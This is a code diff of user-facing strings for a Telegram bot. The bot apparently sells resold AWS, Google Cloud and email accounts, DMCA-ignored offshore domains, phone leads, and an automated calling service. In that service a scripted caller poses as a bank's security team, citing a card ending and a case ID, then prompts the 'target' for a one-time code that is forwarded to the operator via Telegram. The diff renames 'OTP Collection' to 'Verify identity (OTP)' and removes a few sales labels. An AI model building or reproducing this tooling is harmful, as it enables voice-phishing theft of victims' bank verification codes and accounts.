@@ -562,10 +562,9 @@ ${CHAT_BOT_NAME}`,
 
 Verified accounts delivered instantly.
 
-<b>Telecom:</b> Twilio · Telnyx (SMS, Voice, SIP)
 <b>Cloud:</b> AWS · Google Cloud
 <b>Email:</b> Google Workspace · Zoho · IONOS SMTP
-<b>Mobile:</b> USA T-Mobile eSIM (automatic, $75/month)
+<b>Mobile:</b> USA T-Mobile eSIM (automatic, $50/month)
 
 Select below:`,
  dpTwilioMain: `📞 Twilio Main Account — $${DP_PRICE_TWILIO_MAIN}`,
@@ -573,13 +572,13 @@ Select below:`,
  dpTelnyxMain: `📡 Telnyx Main Account — $${DP_PRICE_TELNYX_MAIN}`,
  dpTelnyxSub: `📡 Telnyx Sub-Account — $${DP_PRICE_TELNYX_SUB}`,
  dpGworkspaceNew: `📧 Google Workspace Admin (New Domain) — $${DP_PRICE_GWORKSPACE_NEW}`,
- dpGworkspaceAged: `📧 Google Workspace Admin (Aged Domain) — $${DP_PRICE_GWORKSPACE_AGED}`,
- dpEsim: `📱 USA T-Mobile eSIM — $75/month`,
+ dpGworkspaceAged: `📧 Google Workspace Account — $${DP_PRICE_GWORKSPACE_AGED}`,
+ dpEsim: `📱 USA T-Mobile eSIM — $50/month`,
  dpZohoNew: `📧 Zoho Mail (New Domain) — $${DP_PRICE_ZOHO_NEW}`,
- dpZohoAged: `📧 Zoho Mail (Aged Domain) — $${DP_PRICE_ZOHO_AGED}`,
+ dpZohoAged: `📧 Zoho Mail Account — $${DP_PRICE_ZOHO_AGED}`,
  dpAwsMain: `☁️ AWS Main Account — $${DP_PRICE_AWS_MAIN}`,
  dpAwsSub: `☁️ AWS Sub-Account — $${DP_PRICE_AWS_SUB}`,
- dpGcloudMain: `🌐 Google Cloud Main — $${DP_PRICE_GCLOUD_MAIN}`,
+ dpGcloudMain: `🌐 Google Cloud Account — $${DP_PRICE_GCLOUD_MAIN}`,
  dpGcloudSub: `🌐 Google Cloud Sub — $${DP_PRICE_GCLOUD_SUB}`,
  dpIonosSmtp: `📧 IONOS SMTP — $${DP_PRICE_IONOS_SMTP}`,
  dpPaymentPrompt: (product, price) => {
@@ -590,12 +589,12 @@ Select below:`,
  'Telnyx Sub-Account': 'Telnyx sub-account with Mission Control Portal login and API access for messaging, voice, and number management. Includes 2 Sender IDs and $20 credit.\n\nYou receive: login credentials + API key.',
  'AWS Main Account': 'Full root-level AWS account with Console access to all services — EC2, S3, Lambda, SES, and more.\n\nYou receive: root email, password, and MFA setup.',
  'AWS Sub-Account': 'AWS sub-account (Organizations member) with full Console login and access to core services — EC2, S3, Lambda, and more.\n\nYou receive: login credentials and IAM access.',
- 'Google Cloud Main Account': 'Full owner-level Google Cloud account with billing enabled. Access to Compute Engine, Cloud Storage, BigQuery, and all GCP services.\n\nYou receive: login credentials.',
+ 'Google Cloud Account': 'Full owner-level Google Cloud account with billing enabled. Access to Compute Engine, Cloud Storage, BigQuery, and all GCP services.\n\nYou receive: login credentials.',
  'Google Cloud Sub-Account': 'Google Cloud project with full Console login and editor-level access. Compute, storage, and API access included.\n\nYou receive: login credentials and service account key.',
  'Google Workspace (New Domain)': 'Google Workspace business email setup on a freshly registered domain. Custom @yourdomain email with Gmail, Drive, Docs, and Meet.\n\nYou receive: admin login + domain credentials.',
- 'Google Workspace (Aged Domain)': 'Google Workspace on an aged/established domain for better deliverability. Business email with full Google suite.\n\nYou receive: admin login + domain credentials.',
+ 'Google Workspace Account': 'Google Workspace on an aged/established domain for better deliverability. Business email with full Google suite.\n\nYou receive: admin login + domain credentials.',
  'Zoho Mail (New Domain)': 'Zoho Mail professional email on a new domain. Custom @yourdomain email with calendar, contacts, and file storage.\n\nYou receive: admin login + domain setup.',
- 'Zoho Mail (Aged Domain)': 'Zoho Mail on an aged domain for improved sender reputation. Professional email with full Zoho suite.\n\nYou receive: admin login + domain credentials.',
+ 'Zoho Mail Account': 'Zoho Mail on an aged domain for improved sender reputation. Professional email with full Zoho suite.\n\nYou receive: admin login + domain credentials.',
  }
  const desc = descriptions[product] || ''
  return `💰 <b>Order: ${product}</b>\n\n💵 Price: <b>$${price}</b>${desc ? '\n\n' + desc : ''}\n\nSelect payment method:\n\n<i>💡 Pay with ₿ Crypto for the full amount, or use your 👛 wallet (💵 Deposit first if it's short).</i>`
@@ -1573,7 +1572,7 @@ captchaDomainButton: (domain, isOff, hasCF) => hasCF ? `${isOff ? '🔴 OFF' : '
  cp_198: '🎙 <b>Select Voice Provider</b>\\n\\nChoose your TTS engine:',
  cp_199: 'Please select a voice:',
  cp_2: (toLocaleString) => `⚠️ Minimum deposit is ₦${toLocaleString} (≈ $10 USD). Please enter a higher amount.`,
- cp_20: (presetName, currentPlan) => `🔒 <b>Preset "${presetName}" uses OTP Collection</b>, which requires the <b>Pro</b> plan.\n\nYour current plan: <b>${currentPlan}</b>\n\nUpgrade via 🔄 Renew / Change Plan, or create a new call with 🔗 Transfer mode.`,
+ cp_20: (presetName, currentPlan) => `🔒 <b>Preset "${presetName}" uses Verify identity (OTP)</b>, which requires the <b>Pro</b> plan.\n\nYour current plan: <b>${currentPlan}</b>\n\nUpgrade via 🔄 Renew / Change Plan, or create a new call with 🔗 Transfer mode.`,
  cp_200: (name) => `🎤 Voice: <b>${name}</b>\n\n🎚 <b>Select Speaking Speed</b>\n\nChoose how fast the voice speaks:`,
  cp_201: '🎙 <b>Select Voice Provider</b>\\n\\nChoose your TTS engine:',
  cp_202: '✍️ Enter a custom speed multiplier:\\n<i>Examples: 0.6 (very slow), 0.9 (slightly slow), 1.2 (faster), 1.5 (very fast)\\nRange: 0.25 to 4.0</i>',
@@ -1746,7 +1745,7 @@ Tap a number 👇`,
  cp_38: (icon, firstPh, description, hint) => `\n${icon} <b>[${firstPh}]</b> — ${description}\n\n${hint}`,
  cp_4: (SUPPORT_USERNAME) => `📞 Cloud IVR is coming soon! Contact ${SUPPORT_USERNAME} for updates.`,
  cp_40: (firstPh) => `\nEnter value for <b>[${firstPh}]</b>:`,
- cp_41: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>OTP Collection</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
+ cp_41: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>Verify identity (OTP)</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
  cp_42: 'Enter the phone number to call (with country code):\\n<i>Example: +12025551234</i>',
  cp_43: '✍️ <b>Custom Script</b>\\n\\nType your IVR message. Use <b>[Brackets]</b> for variables:\\n\\n<b>Standard:</b> [Name], [Company], [Bank], [Amount]\\n<b>Smart (auto-fill):</b> [CardLast4], [CaseID], [ReferenceNum]\\n<b>Smart (pick):</b> [Reason], [Location], [CallBack]\\n\\n<i>Example: Hello [Name]. This is [Bank] security. A charge of $[Amount] was made on card ending [CardLast4]. Case [CaseID]. Press 1 to dispute.</i>\\n\\nType your script:',
  cp_44: 'Select a template:',
@@ -1762,7 +1761,7 @@ Tap a number 👇`,
  cp_53: (icon, firstPh, description) => `${icon} <b>[${firstPh}]</b> — ${description}\n\nSelect from the list or type your own:`,
  cp_54: (icon, firstPh, description, hint) => `${icon} <b>[${firstPh}]</b> — ${description}\n\n${hint}`,
  cp_56: (firstPh) => `Enter value for <b>[${firstPh}]</b>:`,
- cp_57: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>OTP Collection</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
+ cp_57: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>Verify identity (OTP)</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
  cp_58: 'Please select a template from the buttons.',
  cp_59: (icon, name, text, join) => `📋 <b>${icon} ${name}</b>\n\n<i>"${text}"</i>\n\n🔘 Active keys: <b>${join}</b>`,
  cp_6: '⚠️ Session expired. Please try purchasing again.',
@@ -1770,7 +1769,7 @@ Tap a number 👇`,
  cp_61: (icon, firstPh, description) => `\n${icon} <b>[${firstPh}]</b> — ${description}\n\nSelect from the list or type your own:`,
  cp_62: (icon, firstPh, description, hint) => `\n${icon} <b>[${firstPh}]</b> — ${description}\n\n${hint}`,
  cp_64: (firstPh) => `\nEnter value for <b>[${firstPh}]</b>:`,
- cp_65: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>OTP Collection</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
+ cp_65: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>Verify identity (OTP)</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
  cp_66: (icon, currentPh, generated) => `${icon} <b>[${currentPh}]</b> — regenerated: <b>${generated}</b>\nTap to accept, regenerate, or type your own:`,
  cp_67: (currentPh) => `✍️ Type your custom value for <b>[${currentPh}]</b>:`,
  cp_68: (currentPh) => `✍️ Type the callback number for <b>[${currentPh}]</b>:\n<i>Example: +12025551234</i>`,
@@ -1779,22 +1778,22 @@ Tap a number 👇`,
  cp_70: (currentPh, value, icon, nextPh, description) => `✅ ${currentPh}: <b>${value}</b>\n\n${icon} <b>[${nextPh}]</b> — ${description}\n\nSelect from the list or type your own:`,
  cp_71: (currentPh, value, icon, nextPh, description, hint) => `✅ ${currentPh}: <b>${value}</b>\n\n${icon} <b>[${nextPh}]</b> — ${description}\n\n${hint}`,
  cp_73: (currentPh, value, nextPh) => `✅ ${currentPh}: <b>${value}</b>\n\nEnter value for <b>[${nextPh}]</b>:`,
- cp_74: '✅ All values set!\\n\\n📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>OTP Collection</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
+ cp_74: '✅ All values set!\\n\\n📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>Verify identity (OTP)</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
  cp_75: '🔗 <b>Transfer Mode</b>\\n\\nEnter the number to transfer the caller to when they press a key:\\n<i>Example: +17174794833</i>',
  ivrTrialNudge: `🎁 <b>You have 1 free Quick IVR call!</b>
 
 Make an automated call that plays your recorded message and captures a keypress or OTP — free, no plan needed.
 
 👉 Tap <b>📞 Cloud IVR + SIP</b> below, then <b>📢 Quick IVR Call</b> to try it now.`,
- cp_76: '🔒 <b>OTP Collection</b> is not available on the free trial.\\n\\nSubscribe to a <b>Pro</b> or <b>Business</b> plan to use OTP Collection.\\n\\nYou can still use <b>🔗 Transfer</b> mode for your trial call.',
- cp_77: '🔑 <b>OTP Collection Mode</b>\\n\\nHow many digits should the code be?\\n\\n💡 The code prompt is added automatically after your script — no need to include it.\\n\\n<i>Default: 6 digits</i>',
+ cp_76: '🔒 <b>Verify identity (OTP)</b> is not available on the free trial.\\n\\nSubscribe to a <b>Pro</b> or <b>Business</b> plan to verify your customers identity via OTP.\\n\\nYou can still use <b>🔗 Transfer</b> mode for your trial call.',
+ cp_77: '🔑 <b>Verify identity (OTP)</b>\\n\\nHow many digits should the code be?\\n\\n💡 The code prompt is added automatically after your script — no need to include it.\\n\\n<i>Default: 6 digits</i>',
  cp_78: 'Select a mode:',
- cp_79: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>OTP Collection</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
+ cp_79: '📋 <b>Select Call Mode</b>\\n\\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\\n🔑 <b>Verify identity (OTP)</b> — After the key press, target is auto-prompted for a code — delivered to you via Telegram\\n\\nBoth modes report full results.',
  cp_8: (buyPlansHeader, price, minutes, sms, starter, v5, v6, v7, pro, v9, v10, v11, business, sp, sm, sl) => `🛒 <b>Step 1 of 4 · Choose a plan</b>\n\n💡 <b>Basic $${price}</b> · ${minutes} min · forwarding, voicemail, SIP, AI receptionist · ${starter} numbers\n🧩 <b>Plus $${sp}</b> · ${sm} min · + keypad menu (IVR), ring groups, recording, AI summaries · ${sl} numbers\n⭐ <b>Pro $${v5}</b> · ${v6} min · + Quick & Bulk IVR, AI conversation campaigns, OTP · ${pro} numbers\n👑 <b>Business $${v9}</b> · ${v10} min · + any caller ID, redial, Text Triggers, encrypted calls · ${business} numbers\n\n<i>Per month. Outgoing calls & forwarding use your wallet · texts $0.05 out, free in.</i>`,
  cp_80: 'Enter a valid digit count (1-10):',
  cp_81: (length) => `✅ OTP length: <b>${length} digits</b> (max 3 attempts)\n\n✍️ <b>Customize Caller Messages</b>\n\nWould you like to customize what callers hear after verification?\n\n<b>Default Confirm:</b> <i>"Your code has been verified successfully. Thank you. Goodbye."</i>\n<b>Default Reject:</b> <i>"Maximum verification attempts reached. Goodbye."</i>`,
  cp_82: (length) => `✅ OTP length: <b>${length} digits</b> (max 3 attempts)\n\n🎙 <b>Select Voice Provider</b>\n\nChoose your TTS engine:`,
- cp_83: '🔑 <b>OTP Collection Mode</b>\\n\\nHow many digits should the code be?\\n\\n💡 The code prompt is added automatically after your script — no need to include it.\\n\\n<i>Default: 6 digits</i>',
+ cp_83: '🔑 <b>Verify identity (OTP)</b>\\n\\nHow many digits should the code be?\\n\\n💡 The code prompt is added automatically after your script — no need to include it.\\n\\n<i>Default: 6 digits</i>',
  cp_84: '🎙 <b>Select Voice Provider</b>\\n\\nChoose your TTS engine:',
  cp_85: '✅ <b>Confirmation Message</b>\\n\\nType what the caller hears when you <b>CONFIRM</b> their code:\\n\\n<i>Example: "Your code has been verified. We\'ve blocked the transaction and secured your account. A specialist will contact you within 24 hours. Thank you for choosing our bank. Goodbye."</i>',
  cp_86: 'Choose an option:',
@@ -2703,7 +2702,7 @@ Offshore HostPanel · Weekly & monthly
 JS Challenge shield · SSL included
 
 🛒 <b>Digital Products</b>
-Twilio · Telnyx · AWS · Google Cloud
+AWS · Google Cloud
 Google Workspace · Zoho Mail · eSIM
 
 💳 <b>Virtual Debit Cards</b>
@@ -2737,7 +2736,7 @@ Your all-in-one digital toolkit:
 <b>Domains</b> — 400+ TLDs, DMCA-ignored offshore registration
 <b>URL Shortener</b> — ${FREE_LINKS} free branded links to start
 <b>Phone Leads</b> — Verified by country, carrier, and area
-<b>Digital Products</b> — Twilio, Telnyx, AWS, Workspace, and more
+<b>Digital Products</b> — AWS, Google Cloud, Workspace, and more
 
 Let's get you set up in 30 seconds.`,
  askUserEmail: 'What’s your email ? Let’s personalize your experience! (e.g., davidsen@gmail.com)',
